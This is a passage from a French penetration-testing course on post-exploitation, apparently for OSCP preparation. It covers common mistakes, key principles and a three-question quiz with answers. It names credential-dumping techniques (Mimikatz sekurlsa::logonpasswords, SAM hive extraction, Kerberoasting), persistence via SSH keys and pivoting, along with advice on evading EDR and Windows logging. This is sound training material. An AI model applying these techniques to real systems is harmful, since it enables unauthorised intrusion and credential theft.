De nombreux pentesteurs adoptent une approche opportuniste de la post-exploitation, suivant les pistes au hasard des découvertes sans stratégie globale. Cette approche peut conduire à :

- Passer trop de temps sur des systèmes peu importants
- Négliger des objectifs à haute valeur
- Dupliquer des efforts inutilement
- Augmenter les risques de détection sans bénéfice proportionnel

Cette erreur est particulièrement coûteuse dans les tests d'intrusion à durée limitée, comme l'examen OSCP.

Pour éviter ce piège, définissez clairement vos objectifs et priorisez vos actions en fonction de leur valeur potentielle et des risques associés. Adoptez une approche méthodique où chaque action s'inscrit dans un plan global, même si ce plan doit être ajusté en cours de route.

### Négligence de la documentation en temps réel

La documentation insuffisante ou tardive est une erreur fréquente qui peut avoir plusieurs conséquences négatives :

- Perte d'informations critiques (credentials, configurations, chemins d'accès)
- Impossibilité de reproduire certaines étapes en cas d'échec
- Difficulté à établir une chronologie précise des actions
- Rapport final incomplet ou imprécis

Cette négligence est souvent due à l'excitation de la découverte ou à la pression temporelle, mais elle peut sérieusement compromettre l'efficacité de la mission.

Pour éviter ce piège, adoptez une discipline stricte de documentation en temps réel. Utilisez des outils comme CherryTree, OneNote ou même un simple éditeur de texte pour consigner chaque commande, chaque résultat significatif, et chaque décision. Prenez des captures d'écran des étapes importantes et organisez vos notes de manière structurée.

### Fixation sur les exploits techniques au détriment de l'OPSEC

De nombreux pentesteurs, particulièrement ceux issus d'un parcours technique, se concentrent excessivement sur l'exploitation des vulnérabilités au détriment des considérations opérationnelles. Cette fixation peut conduire à :

- Utiliser des exploits bruyants alors que des alternatives plus discrètes existent
- Négliger l'impact des actions sur les systèmes de production
- Ignorer les signes de détection ou d'investigation
- Compromettre l'ensemble de la mission pour un gain technique marginal

Cette erreur reflète souvent une vision trop étroite du test d'intrusion, réduit à une série de défis techniques plutôt qu'à une simulation réaliste d'attaque.

Pour éviter ce piège, intégrez l'OPSEC à chaque étape de votre processus décisionnel. Avant chaque action, évaluez non seulement sa faisabilité technique, mais aussi son impact potentiel sur votre discrétion. Privilégiez les approches qui minimisent votre exposition, même si elles sont techniquement moins élégantes.

### Sous-estimation des défenses en profondeur

Une erreur courante consiste à supposer qu'une fois le périmètre franchi ou un système compromis, le reste de l'infrastructure sera facile à explorer. Cette hypothèse néglige le principe de défense en profondeur appliqué dans les organisations matures :

- Segmentation réseau avec contrôles à chaque niveau
- Principe du moindre privilège limitant l'impact d'une compromission
- Surveillance renforcée des systèmes critiques
- Authentification multi-facteur sur les accès sensibles

Cette sous-estimation peut conduire à des stratégies inefficaces et à une progression bloquée.

Pour éviter ce piège, abordez chaque nouveau segment ou système comme un défi distinct, nécessitant sa propre phase de reconnaissance et sa propre stratégie. Ne supposez jamais que les techniques qui ont fonctionné dans un contexte fonctionneront identiquement ailleurs.

## Erreurs spécifiques aux environnements

### Environnements Windows et Active Directory

Dans les environnements Windows, et particulièrement Active Directory, plusieurs pièges spécifiques guettent les pentesteurs :

- **Kerberoasting sans discernement** : L'extraction massive de tickets de service peut déclencher des alertes. Ciblez uniquement les comptes susceptibles d'avoir des privilèges élevés.

- **Énumération excessive des GPO** : L'analyse de toutes les stratégies de groupe génère un trafic LDAP important. Concentrez-vous sur les GPO appliquées aux groupes privilégiés.

- **Négligence des logs de sécurité Windows** : Les événements 4624 (connexion réussie), 4625 (échec de connexion) et 4688 (création de processus) sont particulièrement surveillés. Minimisez les actions générant ces événements.

- **Utilisation de comptes sensibles pour des tâches routinières** : L'utilisation d'un compte administrateur de domaine pour des activités basiques déclenche souvent des alertes. Utilisez le compte avec le niveau de privilège minimum nécessaire.

Pour éviter ces pièges, développez une compréhension approfondie des mécanismes de sécurité et de journalisation spécifiques à Windows. Utilisez des outils comme Event Viewer pour examiner les logs générés par vos propres actions dans un environnement de test.

### Environnements Linux et Unix

Les environnements Linux présentent leurs propres défis et pièges :

- **Sous-estimation d'auditd et des capacités de journalisation** : Contrairement à une idée reçue, les systèmes Linux modernes peuvent avoir une journalisation très détaillée, particulièrement avec des configurations comme auditd ou sysmon-for-linux.

- **Modifications directes des fichiers de configuration critiques** : La modification de fichiers comme /etc/passwd ou /etc/shadow sans sauvegarde peut rendre le système inutilisable. Privilégiez les commandes dédiées (useradd, usermod) plutôt que l'édition directe.

- **Dépendance excessive aux binaires SUID** : Les binaires SUID sont de plus en plus surveillés et restreints. Ne supposez pas qu'une technique d'exploitation classique fonctionnera sans vérification.

- **Négligence des capacités de containment** : Les technologies comme namespaces, cgroups, et seccomp peuvent limiter significativement l'impact d'une compromission initiale. Identifiez ces restrictions avant de planifier votre progression.

Pour éviter ces pièges, familiarisez-vous avec les mécanismes de sécurité spécifiques à Linux et aux différentes distributions. Testez vos techniques dans des environnements variés pour développer une compréhension nuancée de leurs limitations.

## Conclusion sur les pièges classiques

Les pièges évoqués dans cette section ne sont pas exhaustifs, mais représentent les erreurs les plus courantes et les plus coûteuses en post-exploitation. Leur point commun est souvent une approche trop technique et pas assez stratégique, ou une négligence des aspects opérationnels au profit des exploits purement techniques.

Pour devenir un pentesteur efficace, particulièrement dans la perspective de l'OSCP, il est essentiel de développer non seulement des compétences techniques, mais aussi une sensibilité aux considérations OPSEC et une approche méthodique de la post-exploitation.

La prochaine section synthétise les points clés à retenir pour réussir cette phase critique des tests d'intrusion.

# Points clés de la post-exploitation

Cette section résume les principes fondamentaux et les bonnes pratiques de la post-exploitation, constituant une synthèse des connaissances essentielles pour réussir cette phase critique des tests d'intrusion.

## Principes fondamentaux

### La méthodologie prime sur les outils

Le succès en post-exploitation repose davantage sur une méthodologie solide que sur la maîtrise d'outils spécifiques. Les principes méthodologiques essentiels incluent :

- **Approche systématique** : Suivez un processus structuré d'énumération, d'analyse, d'exploitation et de documentation, plutôt qu'une approche opportuniste.

- **Adaptabilité contextuelle** : Ajustez vos techniques en fonction du contexte spécifique (environnement technique, niveau de sécurité, objectifs de la mission).

- **Progression incrémentale** : Avancez par étapes mesurées, en consolidant chaque gain avant de poursuivre l'expansion.

- **Conscience situationnelle** : Maintenez une vision globale de votre position dans l'infrastructure et des risques associés à chaque action.

Ces principes méthodologiques vous permettront d'aborder efficacement même des environnements inconnus ou des situations imprévues.

### L'équilibre entre efficacité et discrétion

La post-exploitation efficace requiert un équilibre constant entre l'atteinte des objectifs et le maintien de la discrétion. Cet équilibre repose sur plusieurs facteurs :

- **Évaluation du risque** : Chaque action doit être évaluée en fonction de son bénéfice potentiel et du risque de détection qu'elle comporte.

- **Adaptation à la surveillance** : L'approche doit être modulée en fonction du niveau de surveillance présumé de l'environnement.

- **Économie de moyens** : Privilégiez les techniques minimales suffisantes plutôt que les approches massives ou redondantes.

- **Patience stratégique** : Acceptez parfois de progresser plus lentement pour maintenir une présence discrète sur le long terme.

Dans le contexte de l'OSCP, cet équilibre est particulièrement important, car l'examen évalue non seulement votre capacité à compromettre des systèmes, mais aussi votre professionnalisme dans l'approche.

### La documentation comme discipline critique

La documentation n'est pas une simple formalité administrative, mais une composante essentielle de la post-exploitation. Une documentation efficace :

- **Capture les informations critiques** : Credentials, configurations, chemins d'accès, vulnérabilités identifiées.

- **Établit une chronologie précise** : Séquence des actions, résultats obtenus, décisions prises.

- **Facilite la reproductibilité** : Instructions détaillées permettant de reproduire chaque étape si nécessaire.

- **Soutient l'analyse** : Base pour identifier des patterns, des opportunités ou des obstacles.

Pour l'OSCP, une documentation rigoureuse vous permettra non seulement de produire un rapport de qualité, mais aussi de maximiser votre efficacité pendant l'examen en évitant de répéter des actions ou de perdre des informations cruciales.

## Compétences techniques essentielles

### Maîtrise de l'énumération ciblée

L'énumération est le fondement de toute post-exploitation réussie. Les compétences essentielles incluent :

- **Hiérarchisation des cibles** : Capacité à identifier les sources d'information les plus pertinentes selon le contexte.

- **Interprétation contextuelle** : Aptitude à donner sens aux données collectées en fonction de l'environnement global.

- **Énumération adaptative** : Ajustement des techniques d'énumération en fonction des résultats initiaux et des contraintes opérationnelles.

- **Détection des anomalies** : Identification des configurations inhabituelles ou des opportunités non évidentes.

Ces compétences vous permettront d'obtenir une compréhension approfondie de l'environnement cible sans générer un volume excessif d'activité détectable.

### Polyvalence dans l'extraction de credentials

L'extraction efficace de credentials nécessite une maîtrise de multiples techniques adaptées à différents contextes :

- **Diversité des sources** : Capacité à identifier et exploiter diverses sources de credentials (mémoire, fichiers, bases de données, services).

- **Adaptation aux protections** : Connaissance des contre-mesures modernes (Credential Guard, PPL) et des techniques pour les contourner ou les éviter.

- **Manipulation sécurisée** : Pratiques pour manipuler les credentials extraits sans les exposer inutilement.

- **Exploitation contextuelle** : Aptitude à utiliser les credentials obtenus de manière optimale selon leur nature et leurs privilèges.

Cette polyvalence vous permettra de maintenir votre progression même face à des environnements diversement protégés.

### Flexibilité dans le pivoting et la persistance

La capacité à naviguer à travers des réseaux complexes et à maintenir l'accès requiert plusieurs compétences clés :

- **Adaptation aux restrictions réseau** : Maîtrise de diverses techniques de tunneling adaptées à différentes configurations de filtrage.

- **Persistance contextuelle** : Sélection de mécanismes de persistance appropriés au système cible et à son niveau de surveillance.

- **Gestion des accès** : Organisation efficace des multiples points d'accès établis dans l'infrastructure.

- **Résilience opérationnelle** : Capacité à rétablir l'accès en cas de perte d'un point d'entrée.

Ces compétences vous permettront de maintenir et d'étendre votre présence dans l'infrastructure cible de manière fiable et discrète.

## Préparation spécifique pour l'OSCP

### Focus sur les techniques manuelles

L'OSCP valorise particulièrement la maîtrise des techniques manuelles et la compréhension fondamentale des mécanismes exploités. Pour exceller :

- **Pratiquez sans outils automatisés** : Entraînez-vous à réaliser manuellement les tâches couramment automatisées pour développer une compréhension approfondie.

- **Décomposez les exploits** : Analysez le fonctionnement interne des exploits plutôt que de les utiliser comme des boîtes noires.

- **Développez vos propres scripts** : Créez des outils personnalisés pour les tâches répétitives, renforçant ainsi votre compréhension.

- **Documentez les commandes essentielles** : Constituez un répertoire personnel des commandes fondamentales pour chaque phase de post-exploitation.

Cette approche vous préparera non seulement à l'OSCP, mais vous donnera aussi des fondations solides pour votre carrière en sécurité offensive.

### Gestion efficace du temps et des ressources

L'OSCP impose des contraintes temporelles significatives, rendant la gestion du temps et des ressources cruciale :

- **Priorisez stratégiquement** : Identifiez et poursuivez d'abord les objectifs à haute valeur et faible risque.

- **Parallélisez intelligemment** : Lancez certaines tâches en arrière-plan pendant que vous travaillez activement sur d'autres.

- **Reconnaissez les impasses** : Développez la capacité à identifier rapidement les pistes non productives pour réorienter vos efforts.

- **Maintenez des sauvegardes** : Préservez des copies de vos accès et informations critiques pour éviter de perdre du temps en cas d'erreur.

Ces compétences vous permettront de maximiser votre efficacité dans les contraintes de l'examen.

### Développement d'une résilience technique et mentale

La post-exploitation, particulièrement dans le cadre de l'OSCP, peut être éprouvante tant techniquement que psychologiquement. Pour développer votre résilience :

- **Pratiquez la résolution méthodique de problèmes** : Abordez les obstacles techniques avec une approche structurée plutôt que par essais et erreurs aléatoires.

- **Cultivez la patience stratégique** : Acceptez que certaines phases nécessitent du temps et de la persévérance.

- **Développez des routines de décompression** : Identifiez des techniques personnelles pour maintenir votre concentration sur de longues périodes.

- **Préparez des plans alternatifs** : Anticipez les échecs potentiels et prévoyez des approches alternatives.

Cette résilience vous permettra de maintenir votre efficacité même dans les phases difficiles de l'examen.

## Conclusion sur les points clés

La post-exploitation représente bien plus qu'une collection de techniques et d'outils ; c'est un art qui combine méthodologie rigoureuse, adaptabilité contextuelle et conscience opérationnelle. Les points clés présentés dans cette section constituent un cadre conceptuel pour développer votre propre approche de la post-exploitation.

Pour l'OSCP et au-delà, rappelez-vous que la différence entre un technicien et un professionnel ne réside pas seulement dans la maîtrise des outils, mais dans la capacité à les appliquer judicieusement dans un contexte spécifique, avec une conscience claire des implications de chaque action.

La prochaine section vous proposera un mini-quiz pour tester votre compréhension des concepts fondamentaux de la post-exploitation.
# Mini-quiz : Testez vos connaissances en post-exploitation

Ce mini-quiz vous permet d'évaluer votre compréhension des concepts fondamentaux de la post-exploitation abordés dans ce chapitre. Pour chaque question, sélectionnez la réponse la plus appropriée.

## Question 1 : Énumération et OPSEC

Lors d'une post-exploitation sur un serveur Windows Server 2019 dans un environnement hautement sécurisé, quelle approche présente le meilleur équilibre entre efficacité d'énumération et discrétion opérationnelle ?

A) Exécuter WinPEAS en mode agressif pour obtenir rapidement toutes les informations pertinentes

B) Télécharger et exécuter BloodHound pour cartographier l'ensemble du domaine Active Directory

C) Utiliser des commandes natives comme `systeminfo`, `net user`, et `netstat` de manière ciblée et progressive

D) Exécuter Mimikatz pour extraire immédiatement tous les credentials et tickets Kerberos disponibles

**Réponse correcte : C**

**Explication :** Dans un environnement hautement sécurisé, les outils automatisés comme WinPEAS (option A) ou BloodHound (option B) génèrent un volume important d'activité système et réseau facilement détectable par les solutions EDR modernes. L'exécution immédiate de Mimikatz (option D) est particulièrement risquée car l'accès au processus LSASS est étroitement surveillé. L'utilisation de commandes natives Windows de manière ciblée (option C) permet de collecter des informations essentielles tout en maintenant un profil bas, car ces commandes font partie de l'administration système légitime et génèrent moins d'alertes. Cette approche progressive permet d'adapter la stratégie d'énumération en fonction des défenses identifiées.

## Question 2 : Dump de credentials et mouvement latéral

Vous avez obtenu un accès avec privilèges limités à un serveur membre d'un domaine Active Directory. Quelle séquence d'actions représente la stratégie la plus efficace pour progresser vers une compromission du domaine ?

A) Exécuter Mimikatz avec `sekurlsa::logonpasswords`, puis utiliser les hachages obtenus pour un Pass-the-Hash vers le contrôleur de domaine

B) Extraire les ruches SAM et SYSTEM, analyser les hachages hors ligne, puis rechercher des fichiers de configuration contenant des credentials de domaine

C) Utiliser Rubeus pour réaliser une attaque Kerberoasting massive sur tous les comptes de service du domaine

D) Installer un keylogger pour capturer les credentials des administrateurs se connectant au serveur

**Réponse correcte : B**

**Explication :** L'option B représente l'approche la plus équilibrée entre efficacité et discrétion. L'extraction des ruches SAM et SYSTEM peut être réalisée avec des outils natifs (comme `reg save`) et l'analyse hors ligne minimise l'activité suspecte sur le système cible. La recherche de credentials dans les fichiers de configuration exploite le fait que les administrateurs stockent souvent des informations d'authentification dans des scripts ou fichiers de configuration. L'option A (Mimikatz) est très surveillée et risque de déclencher des alertes immédiates. L'option C (Kerberoasting massif) génère un volume important de trafic réseau anormal. L'option D (keylogger) est une approche passive qui peut prendre un temps considérable sans garantie de succès, et l'installation d'un keylogger est hautement détectable par les solutions EDR.

## Question 3 : Pivoting et persistance

Après avoir compromis un serveur Linux qui possède deux interfaces réseau (une sur le réseau DMZ accessible et une sur un réseau interne isolé), quelle combinaison de techniques offre le meilleur équilibre entre efficacité opérationnelle et discrétion pour maintenir l'accès et pivoter vers le réseau interne ?

A) Ajouter une entrée crontab exécutant un reverse shell toutes les minutes et configurer un tunnel SSH avec port forwarding vers les cibles internes

B) Installer un rootkit noyau pour la persistance et configurer une règle iptables redirigeant tout le trafic du réseau interne vers votre machine d'attaque

C) Ajouter une clé SSH au compte root et configurer un proxy SOCKS dynamique via SSH pour accéder au réseau interne

D) Remplacer le binaire /bin/bash par une version backdoorée et utiliser netcat pour créer des connexions directes vers les systèmes internes

**Réponse correcte : C**

**Explication :** L'option C offre le meilleur équilibre entre efficacité et discrétion. L'ajout d'une clé SSH est une méthode de persistance fiable et relativement discrète qui survit aux redémarrages et mises à jour. Le proxy SOCKS via SSH permet un pivoting flexible vers le réseau interne tout en bénéficiant du chiffrement SSH, rendant l'analyse du trafic plus difficile. L'option A (crontab avec reverse shell fréquent) crée un trafic sortant régulier facilement détectable. L'option B (rootkit noyau et redirection iptables) est extrêmement invasive et risquée, pouvant causer des instabilités système et générant des anomalies réseau évidentes. L'option D (remplacement de binaire système) risque de perturber le fonctionnement normal du système et les connexions netcat non chiffrées sont facilement détectables.

---

Ces questions couvrent les trois piliers essentiels de la post-exploitation : l'énumération, le dump de credentials, et le pivoting/persistance. Si vous avez correctement répondu à toutes les questions, vous avez assimilé les concepts fondamentaux présentés dans ce chapitre. Si certaines réponses vous ont posé problème, nous vous encourageons à revisiter les sections correspondantes pour renforcer votre compréhension.
